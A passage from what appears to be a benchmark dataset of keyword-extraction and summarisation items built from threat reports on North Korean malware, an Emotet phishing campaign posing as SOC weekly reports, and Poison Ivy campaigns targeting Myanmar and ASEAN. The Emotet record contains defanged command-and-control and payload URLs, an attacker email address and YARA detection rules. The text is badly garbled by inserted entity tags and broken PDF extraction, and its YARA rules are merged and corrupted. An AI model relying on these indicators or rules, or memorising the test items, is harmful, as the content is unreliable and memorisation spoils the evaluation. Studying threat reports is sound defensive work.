Facebook [ORG] Comments [ORG] PluginLeave a CommentCommentName * Email * Please enter an answer in digits : [CARDINAL] 5 \u00d7 3 = [ORG] Post [ORG] Comment [ORG] Post [PRODUCT] CommentAbout | Subscribe | Contact & Media Requests | Privacy Policy | Legal \u00a9 2018 McAfee LLCPDFmyURL - online url to pdf [ORG] conversion\uf099\uf09a\uf0e1\uf167 \uf0d5\uf002\uf002Close MenuSearchBackBusiness EnglishFollow us\uf09a\uf099\uf16a \uf0d5 \uf0e1\uf09eAboutSubscribeContact & Media RequestsPrivacy PolicyLegal \u00a9 McAfee LLCPDFmyURL - online url to pdf conversion", "generated_text": "analysis; North Korean; Malware Families; malware; Operation GhostSecret; MoonSeoul; DarkSeoul; Blockbuster; May; 2012; Lazarus; Silent Chollima; 123; Hidden Cobra; DarkSoul; Blockbuster; Operation Troy; 10 Days of Rain; the link; phishing emails; hackers; the spear; connections; Malware families; 2019; a scale; 30,000; the X-Men; Use; Hong Kong; 2007; the malware; Malware Families; actors; development; tactics; Chinese; security; infrastructure; detection; the world; the attackers; tactics; tools.", "ref_text": "<START-1>The report examines malware campaigns attributed to North Korean state-sponsored threat actors such as Lazarus Group, Silent Chollima, and Group 123. Through code analysis, the researchers found extensive code reuse across many North Korean malware families over time, revealing connections between attacks. The code reuse across campaigns like WannaCry, Mydoom, Dark Hotel, and bank heists indicates North Korea has cyber units with different skills that collaborate when needed. Unit 121 focuses on nationalist aims while Unit 180 focuses on illegal funds. By studying code similarities, the researchers connected many malware families like Brambul, KorDllBot, SierraBravo, NavRAT, and Gold Dragon to the Lazarus Group's operations. Dark Hotel malware also shared code with Troy campaign samples. The timeline shows North Korean cyber activity evolving from 2009 DDoS attacks and wiper malware to recent financially-motivated attacks targeting banks, gambling sites, and cryptocurrencies. The report argues code reuse analysis helps categorize North Korean malware families and groups. It reveals undiscovered links between attacks and allows better attribution by identifying distinctive code markers of North Korean origin. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.43956043956043955, "gpt3/lexical/rouge_rouge2": 0.12154696132596686, "gpt3/lexical/rouge_rougeL": 0.18681318681318682, "gpt3/lexical/rouge_rougeLsum": 0.18681318681318682, "gpt3_generated_text": ["This article presents a research collaboration between Jay Rosenberg from Intezer and Christiaan Beek from McAfee, examining the connections and code reuse among North Korea's malware families. The research reveals links between attacks from various online groups such as Lazarus, Silent Chollima, Group 123, Hidden Cobra, DarkSeoul, Blockbuster, Operation Troy, and 10 Days of Rain, all believed to have originated from North Korea. The article highlights the significance of analyzing code similarities and shared networking infrastructure to identify the connections between different cyber attacks attributed to North Korea. It also mentions the evolution of the country's cyber arsenal and the need for international context to understand the motivations behind their cyber activities. The article emphasizes the importance of identifying reused code to gain insights into known threat actors and their campaigns. Furthermore, it briefly discusses the historical and political events that have shaped North Korea's cyber activities, such as the country's economic challenges and its involvement in illegal operations like gambling and drugs. Overall, the research aims to provide valuable insights into the development and tactics of North Korean cyber attackers and their malware families."]}, {"split_name": "test", "sample_id": "test_31", "prompt_text": "Extract the keywords: [CARDINAL] 2/11/2020Is [PERSON] Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web [ORG] CornerIs [ORG] Emotet gang targeting companies with external SOC?marcoramilli.com/2019/10/14 / is - emotet - gang - targeting - companies - with - external - socView all posts by marcoramilli [ORG] IntroductionOctober 14 , 2019The group behind [PERSON] Emotet malware is getting smarter and smarter in the way the deliver such a [ORG] Malware . While the infection schema looks alike from [DATE] years ; the way the group tries to infect victims improves from day to day . Today I \u2019d like to share a quick analysis resulted by a very interesting email which claimed to deliver a SOC \u201c [DATE] weekly report \u201d on the victim email . [ORDINAL] First of all the attacker knew the target organization was protected by a [ORG] SOC ( Security Operation Center ) so she sent a well crafted email claiming to deliver a [ORG] Microsoft document wrapping out the [DATE] weekly [ORG] SOC report as a normal activity in order to induce the victim to open - it . SOC report [CARDINAL] 10 [CARDINAL] 12 2019.doc ( \ufb01le sent on [DATE] Oct 11 , [DATE] 2019 , [TIME] 11:06:09 [TIME] PM from grecia@ambientehomedecor.com . I believe that ambientehomedecor.com is not a malicious domain but mostly a new compromised one . Word document [PERSON] Dropper ( Emotet ) [ORDINAL] First stage of [PERSON] Emotet campaign targeting organization with [ORG] Security [ORG] Op\u2010 [ORG] eration Centers 6144 : tkPNPASKUzSRnLx3Q4td9pB8LGme764XNNHBly : tkPNPAfU\u2010 GRt3b3B8LGL6CNJFollowing the original eMail headers from grecia@ambientehomedecor.com to victim \u2019s email box it is possible to \ufb01gure - out the attacker used a SMPT client who left trace about the original related to a very nice town in northern [GPE] France : Thury - Harcourt , [ORG] France.url [ORG] Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web CornerThury - Harcourt , [GPE] France . [PERSON] Sender [PERSON] IPThe attached document is a well obfuscated [ORG] Microsoft [ORG] Word document which asks to enable macros in order to view its content . The autoopen function begins a complex obfuscated chain which tries to deter analyst by introducing junk code , junk variable assignments and fake apparent real comments . The following image proves the adopted obfuscation technique . The function c878cxx90590 is [WORK_OF_ART] the \u201c Real [WORK_OF_ART] Code \u201d by meaning is not part of junk code but actually is the function who really performs malicious actions . As you might see being in the middle of [CARDINAL] hundreds similar lines of code it gets hard to spot . Obfuscated [ORG] MacroThe obfuscated macro creates on - memory objects and runs them without passing through temporary \ufb01les . The following image shows the auto - run created object before [ORG] the [ORG] Drop\u2019n [ORG] Execute . The analysed variable in the following image is the c0639047895c6 which , in that speci\ufb01c run , holds the Win32_ProcessStartup created Object for ful\ufb01ll persistence on the victim machine.url [PERSON] Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web [ORG] CornerObject BuildingOnce the dropper assured the persistence and to run during the start - up , it carves from itself the following powershell script . The script runs an encoded string hiding the dropping ULRs . The base64 decoded string shows a romantic foreach statement looping through a list of compromised websites hosting the real payload : \ufb01nally saves the dropped \ufb01le in a userpro\ufb01le location as placed in the variable [ORG] xc0x57b38b2x7 , before running it . The following image shows the powershell script before and after the encoding by giving a quick description on it . Final Deobfuscated Dropperurl Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web CornerAccording to [GPE] VT , the \ufb01nal run looks like [PERSON] Emotet , a banking trojan who steals credentials , cookies and eCoin wallets . [PERSON] Emotet is also able to access to saved credentials of the major browser like Chromium , [WORK_OF_ART] Firefox , [GPE] Opera , [PERSON] Vivaldi to ex\ufb01ltrate cookies , and to send back to command and control found victim information . But let [NORP] \u2019s try to quickly check it . Analysis of dropped and executed \ufb01le ( emotet)Hash Emotet . Data Ex\ufb01ltration Dropped and Executed by previous stage3072:2xUIv\ufb022nnKJFddS2TZGjRurmOEfRtaG/70Jfm4JuLYwO9/+Tl:2lvfUn\u2010 KJFddhAjYrmOEpzc\ufb02Qu1+The dropped \ufb01le ( [ORG] VT [ORG] 12/69 ) , grabbed from the dropping URLs inside the previous powershell script , is an executable packed by internal functions which uses several techniques to avoid static and dynamic analysis . For example it deletes the original \ufb01le once executed , it resolves an unusual very high number of APIs and it dynamically resolves functions avoiding static analysis . Emotet DepackedDuring the running phase the analyzed sample records many information on the hosting machine , it asks for local public [ORG] IP address by querying an external resource : http[://185[.42[.221[.78:443 / whoami.php and \ufb01nally it pushes out those information to external [ORG] Command and Control ( please refer to [LOC] IoC section for the complete C2 list).url Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web [ORG] CornerRecorded [ORG] InformationThe sample starts a local service called khmerdefine and assures its persistence by adding that \ufb01le in c:\\Windows\\SysWOW64 and setting up a system service in autorun . AV and plenty static traf\ufb01c signatures con\ufb01rm we are facing a new encrypted version of [PERSON] Emotet trojan . [ORG] Conclusion [ORG] Emotet gang is getting smarter and smarter in delivery artifacts . That time they addressed companies having an external [ORG] Security [ORG] Operation [ORG] Center ( SOC ) pretending to simulate an external SOC operator who sends periodic reports to the company . The delivery content was a [ORG] Microsoft word document within heavily obfuscated [PERSON] Macros who eventually drops and executes [PERSON] Emotet [PERSON] Malware . The following image represent the compiled MITRE ATT&CK matrix in order to qualify stages and to describe the overall behavior . MITRE ATT&CKIoCemail : grecia@ambientehomedecor.comHash : [PERSON] http[://xsnonline[.us / blogs/4x466v/ http[://obbydeemusic[.com / aqoeivj4fd / us5htvn/ http[://veeplan[.com / wp - content / dW0o3RoJNG/ http[://wwwkmacobd[.com / u9r/ http[://aijdjy[.com / dup - installer / t0 / C2 ( Emotet ): http[://186[.75[.241[.230 / cone / loadan / splash / merge/ http[://186[.75[.241[.230 / results / json / url [PERSON] Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web Cornerhttp[://186[.75[.241[.230 / balloon / json/ http[://186[.75[.241[.230 / enable / arizona / splash / merge/ http[://186[.75[.241[.230 / acquire/ http[://181[.143[.194.[138:443 / health / splash / sess / merge/ [ORG] http[://85[.104[.59[.244:20 / enable / rtm / sess / merge/ Yara Rulesurl Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web Cornerrule EMOTET_SOC_EXE { meta : date = \" [DATE] 2019 - [DATE] 10 - 13 \" $ x1 = \" c:\\\\Users\\\\User\\\\Desktop\\\\2003\\\\Efential\\\\Release\\\\EFENTIAL.pdb \" fullword ascii $ s2 = \" EFENTIAL.exe \" fullword ascii $ s3 = \" [PERSON] ZNtlsIkbp2bxIIBXLbRtd3e85g7mJ73gSFPnybocDj / xsKVPWxzllXY / FdB150 / ewzkkdzDw5VMbiVfS / SPd0FlXp ascii / * base64 encoded string ' nR`nz`ffBh|f|Jhi / Bo}C|zY}RhmnR`nz`ffBh|f|Jhi / Bo}C|zY}RhmnR`nz`ffBh|f|Jhi / Bo}C|zY}RhmnR`nz \" C9813Hcfx1BkY3VrYVwfB4tWs+/Eb93UVwdvrbdywicNqMdPSiMzJFXbZbSLG6cDA / O9Vy2ob3d3PeVLcie95EpT5 \" G+MfTPu8J3chkKdvVwmN7R / fNdx3H8cxWUFva2FcHweLIPfrnG / d1FcHb / FxEOQnDajHT0qu26c122W0ixunZpkE2 \" RSVloG9h6HM56NP1tCMFZKs69gEEW+JoiOCz9U3uI3uYsb+mL2 + 97Wf903wpFDCKiBjjtt / TznbwXOcnHS87rh7rG \" iOC7W7cnZWhtQTw5nu3bSa / eHxvVFB3RfZP9CFkKs3KWazNkXJPk+HTPmTvpWFcnpLn2DUFtp2v1ELP9acqRoKOXI \" StOEJiPbZbiKG6dLTcWrVy28bnd3MRHI6Se9+EtT5xnfnbI/8aimT1vHvvS1PxXYdudP5QazN3cw+OZTG6WMoPkj3 \" G5WtAP8 + 00dbvQhs6PgZzXSo8WjM1YD2S2wk9prpUJn8oG0I4laYrNKGZTi4kPTVMKbGcImVZllhx5Tj+amkWDhXp \" 3ie9qEhT593fXyw/8filT1s1hgetPxWodedPR5foK3cwiOVTG / Eyi+Yj3ZhZV6cVyoNtTw00TR93mxbYI2udnBnjH \" [CARDINAL] 5Ewf7cgaGLAv7VSjeroTTJAjcpy+a7Ql2VPnU2HVntv / mUgzY6rVrB / TYQX35L9Xj+N9SPwkjLT2k+D48S0nWy / tV \" [WORK_OF_ART] 5Ewf7cgaGLAv7VSjeroTTJAjcpy+a7Ql2VPnU2HVntv / mUgzY6rVrB / TYQX35L9Xj+N9SPwkjLT2k+D48S0nWy / tV asciiurl [PERSON] Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli [PERSON] Web Corner$s19 = \" iBunjDe9gVct7Gx3d65SQF8nvahJU+cRqKveP / H4pE9bLL3YAz8VqHTnT7v1JHR3MIjkUxv0uwvjI92YWFenoW2yz [WORK_OF_ART] \" pKjTapsqZ36hVbhZOPU4sD5ekeEYE2WaixuncUK41ZSfp87TA/3tI91r1DvwoBcDoQywknwbTexd6FjAV+2Ac8gY7 uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < 800 [PERSON] KB and date = \" [DATE] 2019 - [DATE] 10 - 13 \" $ x1 = \" * \\\\G{0D452EE1 - E08F-101A-852E- [CARDINAL] 02608C4D0BB4}#2.0#0#C:\\\\windows\\\\system32\\\\FM20.DLL#Microsoft Forms 2.0 Object Library \" fullword wide $ [MONEY] x2 = \" [WORK_OF_ART] Customer50041 [WORK_OF_ART] Keeling [WORK_OF_ART] Bypass , [WORK_OF_ART] North [WORK_OF_ART] Christellefort , [GPE] Tunisia Global128 [PERSON] Manuel [PERSON] Stravenue , [GPE] New [GPE] Nicholasfort , [GPE] Montserrat \" fullword ascii $ [PERSON] x3 = \" * \\\\G{00020430 - 0000 - 0000 - C000- 000000000046}#2.0#0#C:\\\\Windows\\\\system32\\\\stdole2.tlb#OLE Automation \" fullword wide $ [MONEY] x4 = \" [PERSON] Forward297 [PERSON] German [PERSON] Trail , [GPE] West [GPE] Miloshire , [GPE] Germany Product44796 [PERSON] Chesley [PERSON] Bypass , [GPE] East [GPE] Santos , [PERSON] Antigua and Barbudan \" fullword ascii $ x5 = \" Regional1198 [ORG] Rahsaan [ORG] Motorway , [GPE] Klockoburgh , [GPE] Czech [GPE] Republic Human326 Olson Bypass , [ORG] North [ORG] Nicholaus , [GPE] Zimbabwe \" fullword ascii $ x6 = \" [WORK_OF_ART] Dynamic6743 [WORK_OF_ART] Hickle [WORK_OF_ART] Bypass , [GPE] West [GPE] Karliborough , [GPE] United [GPE] States [ORG] Minor [ORG] Outlying [ORG] Islands Product6344 Zieme Inlet , [GPE] Gloverfurt , [GPE] Taiwan \" fullword ascii $ x7 = \" * \\\\G{3D3F9F38 - A9F3 - 48A3 - AE60- [WORK_OF_ART] 38AE7491F39A}#2.0#0#C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\Word8.0\\\\MSForms.exd#Micros [WORK_OF_ART] Forms \" wide $ s8 = \" Central080 [PERSON] Ari [PERSON] Ranch , [GPE] Port [GPE] Sarinachester , [PERSON] Saint [PERSON] Vincent and the Grenadines Product4773 Cornelius Ford , [GPE] Maybelleville , [GPE] Morocco \" fullword ascii $ s9 = \" [WORK_OF_ART] Senior75970 [WORK_OF_ART] Kiehn [WORK_OF_ART] Brook , [GPE] Port [GPE] Joaquin , [PERSON] Comoros [PERSON] Forward6656 [PERSON] Parker [PERSON] Extension , [GPE] Halvorsonton , [GPE] Zambia \" fullword ascii $ s10 = \" [DATE] 6868686868686868686868 \" ascii / * reversed goodware string ' 8686868686868686868686 ' * / / * hex encoded string ' hhhhhhhhhhh ' * / $ s11 = \" * \\\\G{2DF8D04C-5BFA-101B - BDE5 - 00AA0044DE52}#2.8#0#C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\OFFICE16\\\\MSO.DLL#Microsoft \" wide $ s12 = \" [WORK_OF_ART] Dynamic98251 [WORK_OF_ART] Karli Mission , [WORK_OF_ART] Deronhaven , [NORP] Democratic People 's [GPE] Republic [GPE] of [GPE] Korea Chief1365 [PERSON] Hermann [PERSON] Passage , [GPE] Rickyport , [GPE] Oman24 \" fullword ascii $ s13 = \" [WORK_OF_ART] Forward0973 [WORK_OF_ART] Nienow [WORK_OF_ART] Dam , [GPE] Walkermouth , [GPE] Egypt Customer976 [LOC] MacGyver [LOC] Mountain , Schoentown , Northern Mariana Islands+ Lo \" fullword ascii $ s14 = \" Corporate28089 [PERSON] Etha [PERSON] Bypass , [GPE] Jastbury , [GPE] Turkmenistan Dynamic764 [PERSON] Price [PERSON] Cliffs , [GPE] Welchtown , Algeriaog(1 \" fullword ascii $ s15 = \" National4629 [PERSON] Brianne [PERSON] Locks , [GPE] Port [GPE] Shadburgh , [GPE] Bangladesh Forward481 [PERSON] Ashton [PERSON] Course , Lake Judson , [PERSON] Pakistana [PERSON] Pr \" fullword ascii $ s16 = \" [WORK_OF_ART] Forward563 [WORK_OF_ART] Sasha [WORK_OF_ART] Mountains , [GPE] Nitzschestad , [GPE] Palau Lead58549 Lesch Parkways , [GPE] Port [GPE] Archburgh , [GPE] Burundi \" fullword ascii $ s17 = \" [WORK_OF_ART] Forward00009 [WORK_OF_ART] Labadie [WORK_OF_ART] Valley , [ORG] Lake [ORG] Othaview , [PERSON] Brunei [PERSON] Darussalam [CARDINAL] Future796 [WORK_OF_ART] Fritsch Road , Mertzchester , [WORK_OF_ART] Montserrat1831 \" fullword ascii $ s18 = \" Central9007 Leland Isle , [GPE] Laurynview , [ORG] Morocco [ORG] Product75313 [ORG] Mueller [ORG] Harbors , [GPE] West [GPE] Nakiafort , [ORG] Lithuania+ [ORG] Log ( \" fullword ascii $ s19 = \" [WORK_OF_ART] Regional973 [WORK_OF_ART] Aubrey [WORK_OF_ART] Squares , [GPE] South [GPE] Simoneville , [ORG] Svalbard [ORG] & Jan Mayen Islands Dynamic7842 [PERSON] Madilyn [PERSON] Course , [ORG] O'Harastad , [GPE] Armenia \" fullword ascii $ s20 = \" [PERSON] Lead7617 [PERSON] Nicolas [PERSON] Meadows , [PERSON] West [PERSON] Odell , [PERSON] Saint [PERSON] Pierre and [ORG] Miquelon [ORG] Product9412url [ORG] Emotet gang targeting companies with external SOC ? \u2013 [PERSON] Marco [PERSON] Ramilli Web CornerStamm Cove , [GPE] South [GPE] Katlynnport , [PERSON] Comoros \" fullword ascii condition : uint16(0 ) = = [CARDINAL] 0xcfd0 and filesize < 900 [PERSON] KB and [CARDINAL] 1 of ( $ x * ) and [CARDINAL] 4 of them } url", "generated_text": "PDF; Emotet malware; companies; SOC; PowerShell; the PowerShell; a list; compromised websites; the dropper; persistence; the executable; the computer; the payload; configuration; persistence; the malware; the C2 server; the server; the victim; technical details; a command; control; the dropper; the SOC; the attacker; France; the malware; the server; the victim; the attacker; the victim; the victim; the threat actors.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF describes an analysis of a recent Emotet malware campaign targeting organizations with external Security Operations Centers (SOCs). Emotet is a dangerous banking trojan that steals sensitive data. The attacker sent a phishing email pretending to be an external SOC provider, attaching a document claiming to be a \"SOC Weekly Report\". If opened, the document drops and executes the Emotet trojan. Technical analysis shows the initial document attachment contains heavily obfuscated macros that build objects in memory to avoid writing files. A PowerShell script is extracted that decodes to URLs hosting the Emotet payload. Emotet establishes persistence, gathers system info, and exfiltrates it to command and control servers. It also grabs the external IP address of the infected host. The campaign shows how the Emotet gang is getting more sophisticated, now actively targeting companies with external SOC monitoring to try evading detection. This demonstrates attacker knowledge of the target environment and customizing social engineering for maximum impact. Defenses like updated antivirus, caution around attachments, API monitoring, and network traffic analysis can help detect trojans like Emotet. But human awareness of suspicious emails is still extremely important. In summary, the report analyzes how Emotet malware authors are evolving more advanced socially engineered phishing techniques to infect victims and bypass security monitoring. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4574468085106383, "gpt3/lexical/rouge_rouge2": 0.13903743315508024, "gpt3/lexical/rouge_rougeL": 0.25, "gpt3/lexical/rouge_rougeLsum": 0.25, "gpt3_generated_text": ["The article discusses how the Emotet gang is targeting companies with external Security Operation Centers (SOC) by sending well-crafted emails claiming to deliver a weekly SOC report in order to trick victims into opening a malicious Microsoft Word document. The document contains an obfuscated macro that creates on-memory objects and runs them without passing through temporary files, ensuring persistence on the victim's machine. The dropper then carves a PowerShell script that runs an encoded string hiding dropping URLs from a list of compromised websites hosting the real payload. The final run of the malware appears to be Emotet, a banking trojan capable of stealing credentials, cookies, and eCoin wallets, as well as accessing saved credentials of major browsers like Chromium, Firefox, Opera, and Vivaldi. The article provides technical details of the malware's behavior and its connection to a command and control server, highlighting the threat posed by the Emotet gang."]}, {"split_name": "test", "sample_id": "test_32", "prompt_text": "Extract the keywords: Under [PERSON] Attack ? Call ( [CARDINAL] 844 ) END.DDoSNew Poison Ivy Activity Targeting Myanmar , [NORP] Asian \uf0c9 M E N U CountriesB y J a s o n J o n e s o n [DATE] 0 [DATE] 4 [DATE] / [DATE] 2 [DATE] 6 [DATE] / [DATE] 2 [DATE] 0 [DATE] 1 [DATE] 6 . P o s t e d i n a d v a n c e d p e r s i s t e n t t h r e a t s , B a c k d o o r s , M a l w a r e .The infamous [ORG] Remote [ORG] Access [ORG] Trojan ( RAT ) Poison Ivy ( hereafter referred to as PIVY ) has resurfaced recently , and exhibits some new behaviors . PIVY has been observed targeting a number of [NORP] Asian countries for various purposes over [DATE] the [DATE] past [DATE] year . [ORG] Palo [ORG] Alto [ORG] Networks \u2019 Unit [CARDINAL] 42 recently blogged about a new [ORG] Poison Ivy variant targeting [GPE] Hong [GPE] Kong activists dubbed SPIVY that uses [ORG] DLL sideloading and operates quite di erently from a variant recently observed by [ORG] ASERT that has been active for [DATE] at [DATE] least [DATE] the [DATE] past [DATE] 12 [DATE] months . Technical DetailsThe PIVY variant that [ORG] ASERT has observed has exhibited some newer behavior that we have not seen discussed previously . The samples drop a decoy doc \u2013 usually hinting clearly at the target , a [ORG] DLL named [ORG] ActiveUpdate.dll and the PIVY shellcode   le as [NORP] Active.dat . The [ORG] ActiveUpdate.dll and [ORG] Active.dat   les are created in a directory that follows the format [ORG] ActiveUpdate _ [ [CARDINAL] 0 [CARDINAL] - 9]{3 } . The executable copies rundll32.exe to ActiveFlash.exe and then executes the new   le with the path to the [ORG] DLL and installs itself for automatic startup via a .lnk in the Windows Startup folder . ESET identi ed these samples as \u201c Win32 / Korplug . I[F - I ] variant \u201c , possibly due to the appearance of the malware using [ORG] DLL sideloading with [PERSON] rundll32 to load the dropped [ORG] DLL and perform its malicious actions . This deployment tactic dates well into [DATE] last [DATE] year ( and possibly before ) using di erent executable names for the [ORG] rundll32 copy and the base directory name , however this post will only cover a subset of the variant using \u201c ActiveUpdate\u201d . Illustration of execution process of [CARDINAL] one PIVY [ORG] SampleThe compile times on these binaries also closely correlate to the times they were   rst observed in - the - wild and some samples contained timestamp - like entities in the various campaign IDs   elds in the malware con guration . The decrypted con guration appears to be slightly modi ed in such a way as to confuse some publicly available tools that parse the con guration data . The campaign ID is not fully null - padded \u2013 there is now one null - byte and a string of repeating \u201c x \u201d characters that will cause confusion for some scripts . Additionally , the [ORG] C2s are no longer null - padded \u2013 each hostname ends with a null - byte that is then followed by a string that will look [ORG] Command [ORG] & [ORG] Control ( C2 ) server \u2013 the portions that start with \u201c [CARDINAL] 1 \u201d will change to [CARDINAL] 2 for the [ORDINAL] second [CARDINAL] C2 , [CARDINAL] 3 for the [ORDINAL] third , etc . These values end up being present elsewhere in memory without the extra items and only small tweaks are needed to   x the parsing . The hostname webserver.servehttp[.]com is observed in a number of PIVY samples , some of which are covered in this post . Additionally , the [ORG] IP resolved to by this hostname overlapped with   leshare.serveftp[.]com which was used in an earlier and seemingly unrelated PIVY sample . [PERSON] Decoy [PERSON] Document and Targeting InformationA number of PIVY samples were observed to be targeting [GPE] Myanmar and several other countries in [LOC] Asia . While the exact targets and delivery methods are not known to [ORG] ASERT at this time , the documents and submission sources provide strong hints as to the motivations and potential targets of these exploitation campaigns . The sample on the sample was [DATE] November [DATE] 2 , [DATE] 2015 , the apparent timestamp in the   lename appears to be referencing a report that was released on [DATE] November [DATE] 25 , [DATE] 2015 and it was   rst seen [TIME] late [TIME] evening in the [GPE] US on [DATE] November 24 , [DATE] 2015 which would equate to [DATE] November [DATE] 25 in [GPE] Myanmar . The document was dropped as \u201c [WORK_OF_ART] STEP [WORK_OF_ART] Democracy [WORK_OF_ART] Year [WORK_OF_ART] 1 [WORK_OF_ART] Acheivements_25112015.docx \u201d and was also dropped by SHA1 \u201c Year1achievementsv2.docx \u201c , but that sample uses a di erent communications password over the same set of [ORG] C2s . The documents may be drafts of a   nal report released in [DATE] December by [ORG] the [ORG] International [ORG] Institute [ORG] for [ORG] Democracy [ORG] and [ORG] Electoral [ORG] Assistance ( [ORG] IDEA ) , a part of the STEP Democracy initiative . The [ORG] IDEA is \u201c part of [ORG] the [ORG] European [ORG] Union - funded project [ORG] Support [ORG] to [ORG] Electoral [ORG] Processes [ORG] and [ORG] Democracy ( [ORG] STEP [ORG] Democracy ) \u201d whose goal is to support democracy worldwide . The [ORG] IDEA has been working with [GPE] Myanmar before and after their recent election to ensure \u201c peaceful , transparent and credible elections . \u201d Part of this work includes publishing reports and drafts such as those referenced above . In this case , the bait   le document metadata contains a company name of \u201c IDEA \u201d with an author of \u201c Sophia \u201d \u2013 possibly referencing a current member of the organization and a last edited date of [DATE] November 20 , [DATE] 2015 . The content of the document details a debate around the democratic elections in [GPE] Myanmar . This timeline would put the targeting past the elections that occurred in [DATE] early [DATE] November , but appears to still be focused on individuals interested in democracy inside of [GPE] Myanmar . The targeting of the post - election [GPE] Myanmar appears to be following the same style as what was mentioned in the \u201c Uncovering the Seven Pointed Dagger \u201d paper by [ORG] ASERT . In this case however it appears that threat actors began using references to the [ORG] STEP organization to continue their likely spearphish tactic by leveraging content relevant to post - election [GPE] Myanmar . A possible connection exists given that the C2 for these samples \u2013 jackhex.md5c[.]com \u2013 [CARDINAL] Seven Pointed Dagger exploitation campaign . A \u201c LURK0 \u201d [NORP] Gh0strat and another PIVY domain were also observed to have resolved to IPs contained within this range , making this subnet more suspicious from a targeted attack perspective . Dropped document referencing [GPE] Myanmar \u2019s democratic processA number of documents that appear to be economically focused were also observed recently and [CARDINAL] one of these samples also references [GPE] Myanmar . This sample used a campaign ID of \u201c mm20160405 \u201d and dropped a document named \u201c Chairman \u2019s [WORK_OF_ART] Report of the [ORDINAL] 19th [ORG] ASEAN Regional Forum Heads of Defence Universities , Colleges , Instiutions Meeting , [PERSON] Nay [PERSON] Pay [PERSON] Taw , [ORG] Myanmar.doc \u201d that references an [ORG] Association [ORG] of [ORG] Southeast [ORG] Asian [ORG] Nations ( [ORG] ASEAN ) meeting that took place in [GPE] Myanmar in [DATE] September [DATE] of [DATE] 2015 . The timing of this sample is quite di erent from the earlier sample and seems to suggest at least a followup campaign due to the malware compilation timestamp of [DATE] March [DATE] 28 , [DATE] 2016 , combined with an apparent timestamp value in the campaign ID of [DATE] April 5 , [DATE] 2016 and the fact that the binary was   rst observed in the wild on [DATE] April 11 , [DATE] 2016 . The mutex speci ed in the con guration \u2013 20150120 \u2013 is the same mutex used in the earlier sample that dropped a document referencing the [ORG] STEP program , but this mutex is also used in many other PIVY samples that use the \u201c [ORG] ActiveUpdate \u201d directory structure and is likely not useful for identifying the campaign or a relationship between samples outside of possibly sharing a similar version . The C2 used in this sample \u2013 admin.nslookupdns[.]com \u2013 sample discussed , [ORG] ASERT has observed an overlap between many other malware families including [ORG] Nitol , [NORP] Gh0strat , and another PIVY sample that uses \u201c [ORG] ActiveUpdate \u201c . This sample \u2019s C2 domain is news.tibetgroupworks[.]com which provides an obvious suggestion at targeting dynamics , however no decoy documents were dropped and no further information was discovered to help support the targeting hypothesis . Dropped document referencing [ORG] ASEAN meeting in [PRODUCT] MyanmarContinuing on with the theme of campaigns targeting [ORG] ASEAN , sample \u201c Robertus Subono-REGISTRATION_FORM_ASEAN_CMCoord2016.docx \u201d that references an [ORG] ASEAN [ORG] Humanitarian [ORG] Civil [ORG] Military [ORG] Coordination meeting that took place in [GPE] Bangkok [DATE] between [DATE] March [DATE] 28 [DATE] and [DATE] April [DATE] 1 [DATE] 2016 . The document purports to be a registration form for an attendee from [GPE] Indonesia and is supposed to be sent to a Thailand [ORG] Ministry [ORG] of [ORG] Defense email address . The sample has a compilation date of [DATE] March 10 , [DATE] 2016 , was   rst observed by [ORG] ASERT on [DATE] March 20 , [DATE] 2016 and also contains an invalid digital signature claiming to be signed by Google . Coupling the campaign ID of \u201c modth \u201d with the purpose and location of the meeting and the email address this form is supposed to be mailed to , a possible target of this sample could be [ORG] Thailand \u2019s [ORG] Ministry [ORG] of [ORG] Defense . The [ORG] C2s used by this sample overlap with the prior sample that references the [ORG] ASEAN meeting in [GPE] Myanmar nearly perfectly \u2013 the   rst C2 uses port [CARDINAL] 80 , whereas the prior sample used [CARDINAL] 81 and they both use the same mutex and password . This overlap suggests a possible referencing an [ORG] ASEAN meeting in [ORG] ThailandThe decoy document \u201c [CARDINAL] 2016.02.29 - 03.04 -ASEM Weekly.docx \u201d dropped by [LANGUAGE] English like the other [CARDINAL] two observed documents \u2013 Google Translate identi es the language in the document as [NORP] Mongolian . Decoy document references an [LOC] Asia [LOC] - Europe [LOC] Meeting ( ASEM ) dropped a sandbox , but manual recovery yielded a document in [NORP] Korean with a malware campaign ID of kk31 . The document appears to reference [NORP] Korean language schools abroad and the telephone number present yields an a liation with [ORG] the [ORG] Korean [ORG] Ministry [ORG] of [ORG] Foreign named \u201c Commission on [ORG] Filipinos [ORG] Overseas [ORG] & [ORG] Dubai.doc \u201c , but this document did not render correctly in a malware sandbox or manually . [ORG] VirusTotal revealed a sample from the [GPE] Philippines which suggests that they , not [ORG] Dubai [ORG] / [ORG] UAE , were the targets . The C2s for this sample used webserver.servehttp[.]com , also exhibited by many of the recent samples which suggests the same actor may be involved in this campaign activity . ConclusionAs this post and other recent posts detail , PIVY continues to evolve and be used in a myriad of targeted exploitation campaigns \u2013 not unlike many other targeted malware families such as PlugX or the Dukes . This will certainly not be the last evolution of PIVY , and [ORG] ASERT continues to monitor these threats as they are discovered . I would also like to say thank you to [PERSON] Curt [PERSON] Wilson of [ORG] ASERT for his assistance with research covered in this First Seen : [DATE] Nov. 24 , [DATE] 2015 [DATE] Name : STEP Democracy [DATE] Year [DATE] 1 Acheivements_25112015.exe Decoy Doc : STEP Democracy Year 1 Acheivements_25112015.docx Campaign ID : om C2s : jackhex.md5c.net:8080 jackhex.md5c.net:53 jackhex.md5c.net:53 Mutex : 20150120 First Seen : [DATE] Nov. 23 , [DATE] 2015 [DATE] Name : Year1achievementsv2.exe Decoy Doc : Year1achievementsv2.docx 